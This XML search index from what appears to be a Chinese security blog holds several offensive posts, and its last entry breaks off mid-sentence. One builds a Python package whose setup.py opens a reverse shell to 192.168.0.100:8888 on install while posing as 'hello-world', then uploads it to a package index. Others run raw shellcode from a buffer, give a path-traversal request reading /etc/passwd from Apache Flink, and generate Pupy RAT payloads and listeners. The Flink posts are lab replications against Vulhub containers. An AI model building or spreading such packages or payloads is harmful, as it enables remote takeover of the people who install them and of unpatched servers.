<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Evil Python Package Dome</title>
    <link href="/2021/03/21/evil-python-package/"/>
    <url>/2021/03/21/evil-python-package/</url>
    
    <content type="html"><![CDATA[<p>Evil Python Package Dome</p><a id="more"></a><p>文件结构</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">pypi_evil<br>├── __init__.py<br>└── setup.py<br></code></pre></div></td></tr></table></figure><br/>##  创建恶意 setup.py<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> setuptools<br><span class="hljs-keyword">import</span> socket, subprocess, os<br><br><span class="hljs-comment"># Reverse Shell</span><br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>s.connect((<span class="hljs-string">&quot;192.168.0.100&quot;</span>,  <span class="hljs-number">8888</span>))<br>os.dup2(s.fileno(), <span class="hljs-number">0</span>)<br>os.dup2(s.fileno(), <span class="hljs-number">1</span>)<br>os.dup2(s.fileno(), <span class="hljs-number">2</span>)<br>p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-i&quot;</span>]);<br><br><span class="hljs-comment"># 伪装 信息</span><br>setuptools.setup(<br>    name=<span class="hljs-string">&quot;hello-world&quot;</span>,<br>    version=<span class="hljs-string">&quot;0.0.1&quot;</span>,<br>    author=<span class="hljs-string">&quot;Example Author&quot;</span>,<br>    author_email=<span class="hljs-string">&quot;author@example.com&quot;</span>,<br>    description=<span class="hljs-string">&quot;A small example package&quot;</span>,<br>    url=<span class="hljs-string">&quot;https://github.com/pypa/sampleproject&quot;</span>,<br>    packages=setuptools.find_packages(),<br>    classifiers=[<br>        <span class="hljs-string">&quot;Programming Language :: Python :: 3&quot;</span>,<br>        <span class="hljs-string">&quot;License :: OSI Approved :: MIT License&quot;</span>,<br>        <span class="hljs-string">&quot;Operating System :: OS Independent&quot;</span>,<br>    ],<br>    python_requires=<span class="hljs-string">&#x27;&gt;=3.6&#x27;</span>,<br>)<br></code></pre></div></td></tr></table></figure><br/><p>测试是否运行正常</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ ncat -lvnp 8888<br><br><span class="hljs-comment">####</span><br><br>$ python3 setup.py<br></code></pre></div></td></tr></table></figure><br/>## 创建 .pypirc创建 `.pypirc` 用以将包分发到远程服务器(目标)<figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[distutils]</span><br><span class="hljs-attr">index-servers</span> = remote<br><br><span class="hljs-section">[remote]</span><br><span class="hljs-attr">repository</span> = &lt;second-repository URL&gt;<br><span class="hljs-attr">username</span> = &lt;second-repository username&gt;<br><span class="hljs-attr">password</span> = &lt;second-repository password&gt;<br></code></pre></div></td></tr></table></figure><br/>## 分发到远程服务器<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ python3 setup.py sdist upload -r remote <br></code></pre></div></td></tr></table></figure><br/>## Links & Resources- YoutuBe - Ippsec - HackTheBox - SneakyMailer]]></content>
    
    
    <categories>
      
      <category>信息安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Exploit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>判断是否处于沙盒或虚拟机中</title>
    <link href="/2021/02/07/%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%A4%84%E4%BA%8E%E6%B2%99%E7%9B%92%E6%88%96%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD/"/>
    <url>/2021/02/07/%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%A4%84%E4%BA%8E%E6%B2%99%E7%9B%92%E6%88%96%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD/</url>
    
    <content type="html"><![CDATA[<p>Windows 下判断是否处于沙盒或虚拟机中</p><a id="more"></a><p>来源推文: <a href="https://twitter.com/ninjaparanoid/status/1358098804122083334?s=21">Twitter @NinjaParanoid</a></p><br/><p><img src="/assets/img/2021_02_07_%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%A4%84%E4%BA%8E%E6%B2%99%E7%9B%92%E6%88%96%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD/2021-02-07-PM-7.46.15.png" alt="2021-02-07-PM-7.46.15"></p><hr><p>检查 Windows的显示驱动程序，VM显示为 <strong>Non-PnP</strong>，而物理计算机具有 <strong>PnP</strong>（即插即用）驱动程序</p><br/><p>代码实现 <sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="Get the name of a monitor">[1]</span></a></sup></p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    DISPLAY_DEVICE dd;<br>    dd.cb = <span class="hljs-keyword">sizeof</span>(dd);<br>    <span class="hljs-keyword">int</span> deviceIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (EnumDisplayDevices(<span class="hljs-number">0</span>, deviceIndex, &amp;dd, <span class="hljs-number">0</span>))<br>    &#123;<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">wstring</span> deviceName = dd.DeviceName;<br>        <span class="hljs-keyword">int</span> monitorIndex = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (EnumDisplayDevices(deviceName.c_str(), monitorIndex, &amp;dd, <span class="hljs-number">0</span>))<br>        &#123;<br>            <span class="hljs-built_in">std</span>::wcout &lt;&lt; dd.DeviceName &lt;&lt; <span class="hljs-string">L&quot;, &quot;</span> &lt;&lt; dd.DeviceString &lt;&lt; <span class="hljs-string">L&quot;\n&quot;</span>;<br>            ++monitorIndex;<br>        &#125;<br>        ++deviceIndex;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><br/><hr><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://stackoverflow.com/questions/20060584/get-the-name-of-a-monitor">Get the name of a monitor</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>Tips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Tips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Test Page</title>
    <link href="/2021/02/06/Test-Page/"/>
    <url>/2021/02/06/Test-Page/</url>
    
    <content type="html"><![CDATA[<p>测试展示</p><a id="more"></a><h2 id="Header-2"><a href="#Header-2" class="headerlink" title="Header 2"></a>Header 2</h2><p>Easy shellcode</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] =<br>        <span class="hljs-string">&quot;\x48\x31\xc9\x48\x81\xe9\xfc\xff\xff\xff\x48\x8d\x05\xef\xff&quot;</span><br>        <span class="hljs-string">&quot;\xff\xff\x48\xbb\x95\xdb\xe9\x3a\xf5\xd2\xb2\x9b\x48\x31\x58&quot;</span><br>        <span class="hljs-string">&quot;\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xdd\xea\x3b\xd2\xf2\xd2&quot;</span><br>        <span class="hljs-string">&quot;\xb2\x9b\xe2\xb3\x86\x5b\x98\xbb\xb2\xc4\xc7\x8c\xa1\xb3\x13&quot;</span><br>        <span class="hljs-string">&quot;\x9a\x75\x5b\xae\xdb\xe9\x38\xfa\xd7\xb2\x9b&quot;</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Shellcode Length:  %lu\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(buf) - <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">int</span> (*ret)() = (<span class="hljs-keyword">int</span>(*)())buf;<br>    ret();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><br/><blockquote><p>引用 <strong>粗体</strong> <em>斜体</em></p></blockquote><br/><p>生成的 <code>payload</code> 将编译为……</p><br/><p>脚注<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://127.0.0.1/index.php">[1]</span></a></sup></p><h2 id="Image"><a href="#Image" class="headerlink" title="Image"></a>Image</h2><p><img src="/assets/img/Test_Page/twitter_7d6249e5d936454d1442f7dc744183f5.jpeg" alt="From Internet"></p><h2 id="Tag"><a href="#Tag" class="headerlink" title="Tag"></a>Tag</h2><p class="note note-success">标记</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><br>time.sleep(<span class="hljs-number">2</span>)<br>print(<span class="hljs-string">&quot;Hello&quot;</span>)<br></code></pre></div></td></tr></table></figure><p><span class="label label-primary">Label</span></p><br/><hr><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://127.0.0.1/index.php">https://127.0.0.1/index.php</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    
    <tags>
      
      <tag>OTHER</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2020-17518~17519 漏洞复现</title>
    <link href="/2021/01/07/10_44_CVE_2020_17518_17519/"/>
    <url>/2021/01/07/10_44_CVE_2020_17518_17519/</url>
    
    <content type="html"><![CDATA[<p>CVE-2020-17518 | CVE-2020-17519 漏洞复现</p><a id="more"></a><h2 id="ToC"><a href="#ToC" class="headerlink" title="ToC"></a>ToC</h2><ul><li><a href="#i-cve-2020-17519-description">VE-2020-17519 Description</a></li><li><a href="#ii-cve-2020-17518-description">CVE-2020-17518 Description</a></li></ul><br/><h2 id="Apache-Flink"><a href="#Apache-Flink" class="headerlink" title="Apache Flink"></a>Apache Flink</h2><p>Apache Flink 是由 Apache 软件基金会开发的开源流处理框架，其核心是用 Java 和 Scala 编写的分布式流数据流引擎。Flink 以数据并行和管道方式执行任意流数据程序，Flink 的流水线运行时系统可以执行批处理和流处理程序。此外，Flink 的运行时本身也支持迭代算法的执行。</p><p>Flink 提供高吞吐量、低延迟的流数据引擎以及对事件-时间处理和状态管理的支持。Flink 应用程序在发生机器故障时具有容错能力，并且支持 exactly-once 语义。程序可以用 Java、Scala、Python 和 SQL 等语言编写，并自动编译和优化到在集群或云环境中运行的数据流程序。</p><p>Flink 并不提供自己的数据存储系统，但为 Amazon Kinesis、Apache Kafka、Alluxio、HDFS、Apache Cassandra 和 Elasticsearch 等系统提供了数据源和接收器</p><br/><h2 id="I-CVE-2020-17519-Description"><a href="#I-CVE-2020-17519-Description" class="headerlink" title="I. CVE-2020-17519 Description"></a>I. CVE-2020-17519 Description</h2><p>Apache Flink 目录遍历攻击</p><br/><blockquote><p>A change introduced in Apache Flink 1.11.0 (and released in 1.11.1 and 1.11.2 as well) allows attackers to read any file on the local filesystem of the JobManager through the REST interface of the JobManager process. Access is restricted to files accessible by the JobManager process. <a href="https://www.openwall.com/lists/oss-security/2021/01/05/2">CVE-2020-17519</a></p></blockquote><br/><p>在 Apache Flink 1.11.0 中引入的一个变化（在 1.11.1 和 1.11.2 中也有发布）允许攻击者通过 JobManager 进程的 REST 接口读取 JobManager 本地文件系统中的任何文件。访问仅限于 JobManager 进程可以访问的文件。</p><br/><p>受影响的版本: 1.11.0, 1.11.1, 1.11.2</p><br/><p>缓解: 升级到 1.11.3 或以上的版本</p><br/><h3 id="i-漏洞复现"><a href="#i-漏洞复现" class="headerlink" title="i. 漏洞复现"></a>i. 漏洞复现</h3><p>使用 Vulhub 搭建环境:</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">wget https://raw.githubusercontent.com/vulhub/vulhub/c339f4ddd977ff9a956350de4b1e6fb20b7b4415/flink/CVE-2020-17518/docker-compose.yml<br></code></pre></div></td></tr></table></figure><p>创建并启动容器</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">docker-compose up -d<br></code></pre></div></td></tr></table></figure><p>查看容器</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">docker-compose ps<br></code></pre></div></td></tr></table></figure><br/><p>访问 <code>http://127.0.0.1:8081</code> </p><br/><p>PoC:</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /jobmanager/logs/..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>fetc%<span class="hljs-number">252</span>fpasswd<br></code></pre></div></td></tr></table></figure><br/><p>Burp 拦截修改请求</p><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/overview</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/plain, */*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:8081/<br></code></pre></div></td></tr></table></figure><p>修改请求路径</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /jobmanager/logs/..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>fetc%<span class="hljs-number">252</span>fpasswd HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">127.0.0.1:8081</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X<span class="hljs-number">11</span>; Linux x<span class="hljs-number">86</span>_<span class="hljs-number">64</span>; rv:<span class="hljs-number">78</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">78</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: application/json, text/plain, */*<br><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">127.0.0.1:8081</span>/<br></code></pre></div></td></tr></table></figure><br/><p><img src="/assets/img/2021_01_07_10_44_CVE_2020_17518_17519/2021-01-07-11.14.13.png" alt="passwd"></p><br/><h2 id="II-CVE-2020-17518-Description"><a href="#II-CVE-2020-17518-Description" class="headerlink" title="II. CVE-2020-17518 Description"></a>II. CVE-2020-17518 Description</h2><p>Apache Flink 目录遍历攻击: 通过 REST API 远程写入文件</p><br/><blockquote><p>Flink 1.5.1 introduced a REST handler that allows you to write an uploaded file to an arbitrary location on the local file system, through a maliciously modified HTTP HEADER. The files can be written to any location accessible by Flink 1.5.1.  <a href="https://www.openwall.com/lists/oss-security/2021/01/05/1">CVE-2020-17518</a></p></blockquote><br/><p>Flink 1.5.1 引入了一个 REST 处理程序，允许你通过恶意修改的 HTTP HEADER 将上传的文件写入本地文件系统的任意位置。文件可以写到 Flink 1.5.1 可以访问的任何位置。</p><br/><p>受影响版本：1.5.1 to 1.11.2</p><br/><p>缓解：升级到 1.11.3 或以上的版本</p><br/><h3 id="i-漏洞复现-1"><a href="#i-漏洞复现-1" class="headerlink" title="i. 漏洞复现"></a>i. 漏洞复现</h3><p>继续使用上面创建的容器</p><p>PoC：<br><a href="https://github.com/QmF0c3UK/CVE-2020-17518">QmF0c3UK/CVE-2020-17518</a></p><p>执行 PoC：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">python3 poc.py -u http://127.0.0.1:8081<br></code></pre></div></td></tr></table></figure><p>查看利用是否成功：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">docker-compose <span class="hljs-built_in">exec</span> flink ls /tmp<br></code></pre></div></td></tr></table></figure><br/><p><img src="/assets/img/2021_01_07_10_44_CVE_2020_17518_17519/2021-01-07-12.35.29.png" alt="success"></p><br/><h2 id="Links-amp-Resources"><a href="#Links-amp-Resources" class="headerlink" title="Links &amp; Resources"></a>Links &amp; Resources</h2><ul><li><a href="https://zh.wikipedia.org/wiki/Apache_Flink">维基百科</a></li><li><a href="https://www.openwall.com/lists/oss-security/2021/01/05/1">CVE-2020-17518</a></li><li><a href="https://www.openwall.com/lists/oss-security/2021/01/05/2">CVE-2020-17519 Detail</a></li><li><a href="https://github.com/QmF0c3UK/CVE-2020-17518">QmF0c3UK/CVE-2020-17518</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>信息安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Use Pupy RAT On Docker</title>
    <link href="/2020/12/17/17_47_pupy_rat_docker_use/"/>
    <url>/2020/12/17/17_47_pupy_rat_docker_use/</url>
    
    <content type="html"><![CDATA[<p>Pupy Remote Administrator Tools</p><a id="more"></a><blockquote><p>Pupy is an opensource, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool mainly written in python</p></blockquote><br/><h2 id="Pull"><a href="#Pull" class="headerlink" title="Pull"></a>Pull</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">docker pull alxchk/pupy:unstable<br></code></pre></div></td></tr></table></figure><br/><h2 id="Deploy"><a href="#Deploy" class="headerlink" title="Deploy"></a>Deploy</h2><p>生成 SSH Key</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ssh-keygen -f pupy<br></code></pre></div></td></tr></table></figure><p>创建 pupy 项目目录(存放 Payload 输出、Key等)</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">mkdir -p /tmp/pupy<br></code></pre></div></td></tr></table></figure><p>docker run</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">docker run -d -p 2022:22 -v /tmp/pupy:/projects alxchk/pupy:unstable<br></code></pre></div></td></tr></table></figure><p>复制生成的 SSH 公钥到 <code>/tmp/pupy/keys/authorized_keys</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">cp pupy.pub /tmp/pupy/keys/authorized_keys<br></code></pre></div></td></tr></table></figure><p>登录到 Pupy</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ssh pupy@127.0.0.1 -p 2022 -i pupy<br></code></pre></div></td></tr></table></figure><br/><h2 id="Basic-Usage"><a href="#Basic-Usage" class="headerlink" title="Basic Usage"></a>Basic Usage</h2><p>查看配置 (IP、Port等)</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">docker inspect container_name<br></code></pre></div></td></tr></table></figure><p>登录进入的基本窗口是 Tmux，默认前缀键：<code>C-b</code></p><p><img src="/assets/img/2020_12_17_17_47_pupy_rat_docker_use/2020-12-17-pm-6.10.57.png" alt="img"></p><br/><p>生成 Payload</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">gen -f client -O linux -A x64 connect -c 172.17.0.2:8080<br></code></pre></div></td></tr></table></figure><p>Sessions 列表</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sessions<br></code></pre></div></td></tr></table></figure><p><img src="/assets/img/2020_12_17_17_47_pupy_rat_docker_use/2020-12-17-pm-6.17.51.png" alt="sessions"></p><p>监听器: Listen</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">listen -a ssl 443<br>listen -a http 4444<br><br>listen -L<br></code></pre></div></td></tr></table></figure><p><img src="/assets/img/2020_12_17_17_47_pupy_rat_docker_use/2020-12-17-pm-6.54.47.png" alt="Listen"><br><img src="/assets/img/2020_12_17_17_47_pupy_rat_docker_use/2020-12-17-pm-8.32.07.png" alt="Listen"></p><br/><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">gen -f <span class="hljs-tag">&lt;<span class="hljs-name">format</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">launcher</span>&gt;</span> -t <span class="hljs-tag">&lt;<span class="hljs-name">transport</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>Command</p><figure class="highlight prolog"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs prolog">[-f &#123;client,py,pyinst,py_oneliner,ps1,ps1_oneliner,rubber_ducky,csharp,.<span class="hljs-symbol">NET</span>,.<span class="hljs-symbol">NET_oneliner</span>&#125;]<br>[-<span class="hljs-symbol">O</span> &#123;android,windows,linux,solaris&#125;] [-<span class="hljs-symbol">A</span> &#123;x86,x64,armhf&#125;]<br>[-<span class="hljs-symbol">U</span>] [-<span class="hljs-symbol">P</span> <span class="hljs-symbol">PACKER</span>] [-<span class="hljs-symbol">S</span>] [-o <span class="hljs-symbol">OUTPUT</span>]<br>[-d &lt;<span class="hljs-symbol">ATTEMPTS</span>&gt; &lt;<span class="hljs-symbol">MIN</span> <span class="hljs-symbol">SEC</span>&gt; &lt;<span class="hljs-symbol">MAX</span> <span class="hljs-symbol">SEC</span>&gt;] [-<span class="hljs-symbol">D</span> <span class="hljs-symbol">OUTPUT_DIR</span>]<br>[-s <span class="hljs-symbol">SCRIPTLET</span>] [-l] [-<span class="hljs-symbol">E</span>] [--no-use-proxy]<br>[--oneliner-nothidden] [--debug-scriptlets] [--debug]<br>[--workdir <span class="hljs-symbol">WORKDIR</span>]<br>[&#123;bind,auto_proxy,dnscnc,connect&#125;] ...<br></code></pre></div></td></tr></table></figure><p>format</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">client</span>, py, pyinst, py_oneliner, ps<span class="hljs-number">1</span>, ps<span class="hljs-number">1</span>_oneliner, rubber_ducky, csharp, .NET, .NET_oneliner<br></code></pre></div></td></tr></table></figure><blockquote><p>client : executable to run on the target (.exe, .dll, .lin, 